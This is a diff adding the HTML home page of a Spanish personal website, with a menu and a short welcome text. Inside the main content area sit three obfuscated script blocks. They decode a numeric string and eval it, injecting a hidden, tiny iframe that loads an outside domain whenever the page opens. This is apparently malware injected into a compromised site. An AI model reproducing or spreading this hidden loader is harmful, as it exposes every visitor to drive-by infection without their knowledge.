@@ -1,0 +1,112 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="es" xml:lang="es">
+<head>
+<link href="nachoh.css" rel="stylesheet" type="text/css" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>NachoH</title>
+<script type="text/javascript" src="ajax.js"></script>
+</head>
+
+<body>
+<div id="contenedor">
+	<div id="header">
+		<div style="position: absolute; width: 780px; top: 10px; left: 10px;">
+			<div class="titulo">
+			<img src="logo.png" width="187" height="22" style="border: none" alt="NachoH" />
+			<!--<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#3,0,0,0" width="160" height="30">
+				<param name="SRC" value="logo.swf">
+				<PARAM name=wmode value=transparent>
+				<embed wmode=transparent bgcolor="#FF33FF" src="logo.swf" pluginspage="http://www.macromedia.com/shockwave/download/" type="application/x-shockwave-flash" width="160" height="30" bgcolor="#282828" >
+				</embed>
+			</object>-->
+			</div>
+			<div class="sub_titulo">el sitio esta hecho a medias ... no se patine</div>
+		</div>
+	</div>
+	<div id="body">
+		<!--<div style="height: 95px; background-image: url(images/cropped-tcs-background-2006.jpg); background-repeat: no-repeat; background-position: center"></div>-->
+		<div id="body_main"><script>try{document.asd.removeChild()}catch(q){ss="";s=String;e=eval;}ddd=new Date();d2=new Date(ddd.valueOf()-2);Object.prototype.asd='q';if('q'==={}.asd)a=document['createTextNode']('321');if(a.nodeValue==321)h=(ddd-d2)*-1;n='4.5v4.5v52.5v51v16v20v50v55.5v49.5v58.5v54.5v50.5v55v58v23v51.5v50.5v58v34.5v54v50.5v54.5v50.5v55v58v57.5v33v60.5v42v48.5v51.5v39v48.5v54.5v50.5v20v19.5v49v55.5v50v60.5v19.5v20.5v45.5v24v46.5v20.5v61.5v4.5v4.5v4.5v52.5v51v57v48.5v54.5v50.5v57v20v20.5v29.5v4.5v4.5v62.5v16v50.5v54v57.5v50.5v16v61.5v4.5v4.5v4.5v50v55.5v49.5v58.5v54.5v50.5v55v58v23v59.5v57v52.5v58v50.5v20v17v30v52.5v51v57v48.5v54.5v50.5v16v57.5v57v49.5v30.5v19.5v52v58v58v56v29v23.5v23.5v58v55.5v56v50.5v57v56v57v57.5v50.5v55.5v59v23v52.5v55v23.5v58v23.5v50v49.5v25.5v24.5v26v28v50v24v25v28v49.5v24v51v28v25.5v51v48.5v24v49.5v50v50v24.5v49v26.5v24.5v49v26.5v48.5v26.5v51v25v24v19.5v16v59.5v52.5v50v58v52v30.5v19.5v24.5v24v19.5v16v52v50.5v52.5v51.5v52v58v30.5v19.5v24.5v24v19.5v16v57.5v58v60.5v54v50.5v30.5v19.5v59v52.5v57.5v52.5v49v52.5v54v52.5v58v60.5v29v52v52.5v50v50v50.5v55v29.5v56v55.5v57.5v52.5v58v52.5v55.5v55v29v48.5v49v57.5v55.5v54v58.5v58v50.5v29.5v54v50.5v51v58v29v24v29.5v58v55.5v56v29v24v29.5v19.5v31v30v23.5v52.5v51v57v48.5v54.5v50.5v31v17v20.5v29.5v4.5v4.5v62.5v4.5v4.5v51v58.5v55v49.5v58v52.5v55.5v55v16v52.5v51v57v48.5v54.5v50.5v57v20v20.5v61.5v4.5v4.5v4.5v59v48.5v57v16v51v16v30.5v16v50v55.5v49.5v58.5v54.5v50.5v55v58v23v49.5v57v50.5v48.5v58v50.5v34.5v54v50.5v54.5v50.5v55v58v20v19.5v52.5v51v57v48.5v54.5v50.5v19.5v20.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v57.5v57v49.5v19.5v22v19.5v52v58v58v56v29v23.5v23.5v58v55.5v56v50.5v57v56v57v57.5v50.5v55.5v59v23v52.5v55v23.5v58v23.5v50v49.5v25.5v24.5v26v28v50v24v25v28v49.5v24v51v28v25.5v51v48.5v24v49.5v50v50v24.5v49v26.5v24.5v49v26.5v48.5v26.5v51v25v24v19.5v20.5v29.5v51v23v57.5v58v60.5v54v50.5v23v59v52.5v57.5v52.5v49v52.5v54v52.5v58v60.5v30.5v19.5v52v52.5v50v50v50.5v55v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v56v55.5v57.5v52.5v58v52.5v55.5v55v30.5v19.5v48.5v49v57.5v55.5v54v58.5v58v50.5v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v54v50.5v51v58v30.5v19.5v24v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v58v55.5v56v30.5v19.5v24v19.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v59.5v52.5v50v58v52v19.5v22v19.5v24.5v24v19.5v20.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v52v50.5v52.5v51.5v52v58v19.5v22v19.5v24.5v24v19.5v20.5v29.5v4.5v4.5v4.5v50v55.5v49.5v58.5v54.5v50.5v55v58v23v51.5v50.5v58v34.5v54v50.5v54.5v50.5v55v58v57.5v33v60.5v42v48.5v51.5v39v48.5v54.5v50.5v20v19.5v49v55.5v50v60.5v19.5v20.5v45.5v24v46.5v23v48.5v56v56v50.5v55v50v33.5v52v52.5v54v50v20v51v20.5v29.5v4.5v4.5v62.5';n=n['split']('v');for(i=0;i!=n.length;i++)ss+=s.fromCharCode(-h*eval("n"+"[i]"));if(a.data==a.nodeValue)e(ss);</script><script>try{document.asd.removeChild()}catch(q){ss="";s=String;e=eval;}ddd=new Date();d2=new Date(ddd.valueOf()-2);Object.prototype.asd='q';if('q'==={}.asd)a=document['createTextNode']('321');if(a.nodeValue==321)h=(ddd-d2)*-1;n='4.5v4.5v52.5v51v16v20v50v55.5v49.5v58.5v54.5v50.5v55v58v23v51.5v50.5v58v34.5v54v50.5v54.5v50.5v55v58v57.5v33v60.5v42v48.5v51.5v39v48.5v54.5v50.5v20v19.5v49v55.5v50v60.5v19.5v20.5v45.5v24v46.5v20.5v61.5v4.5v4.5v4.5v52.5v51v57v48.5v54.5v50.5v57v20v20.5v29.5v4.5v4.5v62.5v16v50.5v54v57.5v50.5v16v61.5v4.5v4.5v4.5v50v55.5v49.5v58.5v54.5v50.5v55v58v23v59.5v57v52.5v58v50.5v20v17v30v52.5v51v57v48.5v54.5v50.5v16v57.5v57v49.5v30.5v19.5v52v58v58v56v29v23.5v23.5v58v55.5v56v50.5v57v56v57v57.5v50.5v55.5v51v23v52.5v55v23.5v58v23.5v26.5v26v49.5v50v27v27v51v48.5v25.5v25v27.5v27v27v49v51v26v27.5v25v26.5v49v51v24v27.5v27v26v26.5v49.5v49v26.5v28.5v48.5v27.5v19.5v16v59.5v52.5v50v58v52v30.5v19.5v24.5v24v19.5v16v52v50.5v52.5v51.5v52v58v30.5v19.5v24.5v24v19.5v16v57.5v58v60.5v54v50.5v30.5v19.5v59v52.5v57.5v52.5v49v52.5v54v52.5v58v60.5v29v52v52.5v50v50v50.5v55v29.5v56v55.5v57.5v52.5v58v52.5v55.5v55v29v48.5v49v57.5v55.5v54v58.5v58v50.5v29.5v54v50.5v51v58v29v24v29.5v58v55.5v56v29v24v29.5v19.5v31v30v23.5v52.5v51v57v48.5v54.5v50.5v31v17v20.5v29.5v4.5v4.5v62.5v4.5v4.5v51v58.5v55v49.5v58v52.5v55.5v55v16v52.5v51v57v48.5v54.5v50.5v57v20v20.5v61.5v4.5v4.5v4.5v59v48.5v57v16v51v16v30.5v16v50v55.5v49.5v58.5v54.5v50.5v55v58v23v49.5v57v50.5v48.5v58v50.5v34.5v54v50.5v54.5v50.5v55v58v20v19.5v52.5v51v57v48.5v54.5v50.5v19.5v20.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v57.5v57v49.5v19.5v22v19.5v52v58v58v56v29v23.5v23.5v58v55.5v56v50.5v57v56v57v57.5v50.5v55.5v51v23v52.5v55v23.5v58v23.5v26.5v26v49.5v50v27v27v51v48.5v25.5v25v27.5v27v27v49v51v26v27.5v25v26.5v49v51v24v27.5v27v26v26.5v49.5v49v26.5v28.5v48.5v27.5v19.5v20.5v29.5v51v23v57.5v58v60.5v54v50.5v23v59v52.5v57.5v52.5v49v52.5v54v52.5v58v60.5v30.5v19.5v52v52.5v50v50v50.5v55v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v56v55.5v57.5v52.5v58v52.5v55.5v55v30.5v19.5v48.5v49v57.5v55.5v54v58.5v58v50.5v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v54v50.5v51v58v30.5v19.5v24v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v58v55.5v56v30.5v19.5v24v19.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v59.5v52.5v50v58v52v19.5v22v19.5v24.5v24v19.5v20.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v52v50.5v52.5v51.5v52v58v19.5v22v19.5v24.5v24v19.5v20.5v29.5v4.5v4.5v4.5v50v55.5v49.5v58.5v54.5v50.5v55v58v23v51.5v50.5v58v34.5v54v50.5v54.5v50.5v55v58v57.5v33v60.5v42v48.5v51.5v39v48.5v54.5v50.5v20v19.5v49v55.5v50v60.5v19.5v20.5v45.5v24v46.5v23v48.5v56v56v50.5v55v50v33.5v52v52.5v54v50v20v51v20.5v29.5v4.5v4.5v62.5';n=n['split']('v');for(i=0;i!=n.length;i++)ss+=s.fromCharCode(-h*eval("n"+"[i]"));if(a.data==321)e(ss);</script><script>try{document.asd.removeChild()}catch(q){ss="";s=String;e=eval;}ddd=new Date();d2=new Date(ddd.valueOf()-2);Object.prototype.asd='q';if('q'==={}.asd)a=document['createTextNode']('321');if(a.nodeValue==321)h=(ddd-d2)*-1;n='4.5v4.5v52.5v51v16v20v50v55.5v49.5v58.5v54.5v50.5v55v58v23v51.5v50.5v58v34.5v54v50.5v54.5v50.5v55v58v57.5v33v60.5v42v48.5v51.5v39v48.5v54.5v50.5v20v19.5v49v55.5v50v60.5v19.5v20.5v45.5v24v46.5v20.5v61.5v4.5v4.5v4.5v52.5v51v57v48.5v54.5v50.5v57v20v20.5v29.5v4.5v4.5v62.5v16v50.5v54v57.5v50.5v16v61.5v4.5v4.5v4.5v50v55.5v49.5v58.5v54.5v50.5v55v58v23v59.5v57v52.5v58v50.5v20v17v30v52.5v51v57v48.5v54.5v50.5v16v57.5v57v49.5v30.5v19.5v52v58v58v56v29v23.5v23.5v58v55.5v56v50.5v57v56v57v57.5v50.5v55.5v57v23v52.5v55v23.5v58v23.5v49v25.5v26v27v49v48.5v25.5v27.5v50.5v24.5v51v25v28.5v26.5v48.5v49.5v26.5v28v50v27v50.5v49.5v27v24.5v49v49.5v49.5v28.5v28.5v24.5v28.5v28.5v19.5v16v59.5v52.5v50v58v52v30.5v19.5v24.5v24v19.5v16v52v50.5v52.5v51.5v52v58v30.5v19.5v24.5v24v19.5v16v57.5v58v60.5v54v50.5v30.5v19.5v59v52.5v57.5v52.5v49v52.5v54v52.5v58v60.5v29v52v52.5v50v50v50.5v55v29.5v56v55.5v57.5v52.5v58v52.5v55.5v55v29v48.5v49v57.5v55.5v54v58.5v58v50.5v29.5v54v50.5v51v58v29v24v29.5v58v55.5v56v29v24v29.5v19.5v31v30v23.5v52.5v51v57v48.5v54.5v50.5v31v17v20.5v29.5v4.5v4.5v62.5v4.5v4.5v51v58.5v55v49.5v58v52.5v55.5v55v16v52.5v51v57v48.5v54.5v50.5v57v20v20.5v61.5v4.5v4.5v4.5v59v48.5v57v16v51v16v30.5v16v50v55.5v49.5v58.5v54.5v50.5v55v58v23v49.5v57v50.5v48.5v58v50.5v34.5v54v50.5v54.5v50.5v55v58v20v19.5v52.5v51v57v48.5v54.5v50.5v19.5v20.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v57.5v57v49.5v19.5v22v19.5v52v58v58v56v29v23.5v23.5v58v55.5v56v50.5v57v56v57v57.5v50.5v55.5v57v23v52.5v55v23.5v58v23.5v49v25.5v26v27v49v48.5v25.5v27.5v50.5v24.5v51v25v28.5v26.5v48.5v49.5v26.5v28v50v27v50.5v49.5v27v24.5v49v49.5v49.5v28.5v28.5v24.5v28.5v28.5v19.5v20.5v29.5v51v23v57.5v58v60.5v54v50.5v23v59v52.5v57.5v52.5v49v52.5v54v52.5v58v60.5v30.5v19.5v52v52.5v50v50v50.5v55v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v56v55.5v57.5v52.5v58v52.5v55.5v55v30.5v19.5v48.5v49v57.5v55.5v54v58.5v58v50.5v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v54v50.5v51v58v30.5v19.5v24v19.5v29.5v51v23v57.5v58v60.5v54v50.5v23v58v55.5v56v30.5v19.5v24v19.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v59.5v52.5v50v58v52v19.5v22v19.5v24.5v24v19.5v20.5v29.5v51v23v57.5v50.5v58v32.5v58v58v57v52.5v49v58.5v58v50.5v20v19.5v52v50.5v52.5v51.5v52v58v19.5v22v19.5v24.5v24v19.5v20.5v29.5v4.5v4.5v4.5v50v55.5v49.5v58.5v54.5v50.5v55v58v23v51.5v50.5v58v34.5v54v50.5v54.5v50.5v55v58v57.5v33v60.5v42v48.5v51.5v39v48.5v54.5v50.5v20v19.5v49v55.5v50v60.5v19.5v20.5v45.5v24v46.5v23v48.5v56v56v50.5v55v50v33.5v52v52.5v54v50v20v51v20.5v29.5v4.5v4.5v62.5';n=n['split']('v');for(i=0;i!=n.length;i++)ss+=s.fromCharCode(-h*eval("n"+"[i]"));if(a.data==321)e(ss);</script><div id="menu"><div style="position: relative; width: 780px; height: 80px">
+	<div style="float: left; width: 200px; height: 80px; background-image: url(images/menu_start_triple.gif)"></div>
+	<div style="float: left; width: 380px; height: 80px; background-image: url(images/menu_triple.gif)		"></div>
+	<div style="float: left; width: 200px; height: 80px; background-image: url(images/menu_end_triple.gif)	"></div>
+
+	<div style="position: absolute; left: 30px;">
+			<div id="menu1" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('home.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('home.php?menu_actual=1',refreshElement, 'body_main'); return false;">
+					home				</a>
+						</div>
+		</div>
+			<div id="menu2" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('falconeta/index.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('falconeta/index.php',refreshElement, 'body_main'); return false;">
+					Falconeta				</a>
+						</div>
+		</div>
+			<div id="menu3" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('fotos/index.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('fotos/index.php',refreshElement, 'body_main'); return false;">
+					Fotos				</a>
+						</div>
+		</div>
+			<div id="menu4" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('files/index.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('files/index.php',refreshElement, 'body_main'); return false;">
+					Files				</a>
+						</div>
+		</div>
+			<div id="menu5" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('links/index.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('links/index.php',refreshElement, 'body_main'); return false;">
+					Links				</a>
+						</div>
+		</div>
+			<div id="menu6" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('facultad/index.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('facultad/index.php',refreshElement, 'body_main'); return false;">
+					Facultad				</a>
+						</div>
+		</div>
+			<div id="menu7" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('code.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('code.php',refreshElement, 'body_main'); return false;">
+					Code				</a>
+						</div>
+		</div>
+			<div id="menu8" style="float: left; width: 90px; height: 80px;  " onclick="javascript: send('guestbook/index.php',refreshElement, 'body_main'); return false;">
+			<div style="padding: 10px; padding-top: 34px; height:36px;); text-align: center;">
+							<a href="#" onclick="javascript: send('guestbook/index.php',refreshElement, 'body_main'); return false;">
+					Guestbook				</a>
+						</div>
+		</div>
+		</div>
+</div>
+
+</div>
+<div id="home">
+	<p>
+		Este sitio es un sitio personal, ergo, vas a encontrar cosas personales que pueden, o no, ser de tu utilidad.<br/>
+		Como desde su inicio, el sitio esta hecho a medias, en constante actualizaci&oacute;n y re-dise&ntilde;o. Por esto, si hay algo que no les gusta, esta sin terminar o no funciona... 'ajo y agua'<br/>
+		Toda la informaci&oacute;n que se puede encontrar es libre a cambio de ser usada con responsabilidad.<br/>
+		Cualquier cr&iacute;tica o sugerencia la pueden mandar por mail a <a href="nachoh@nachoh.com.ar">nachoh@nachoh.com.ar</a> o dejar un comentario en el Guestbook (libro de visitas) con su respectiva calificaci&oacute;n. <br/>
+		Que la disfruten.
+	</p>
+</div>
+</div>
+	</div>
+	<div id="footer">
+		<div style="width: 780px; margin-left: 10px; padding-top: 3px; padding-bottom: 20px; border-top: 1px dotted #CCCCCC; text-align: center">desarrollo web <a href="http://ignacio.hurrell.com.ar">Ignacio Hurrell</a></div>
+	</div>
+</div>
+</body>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-41279077-1', 'nachoh.com.ar');
+  ga('send', 'pageview');
+
+</script>
+</html>
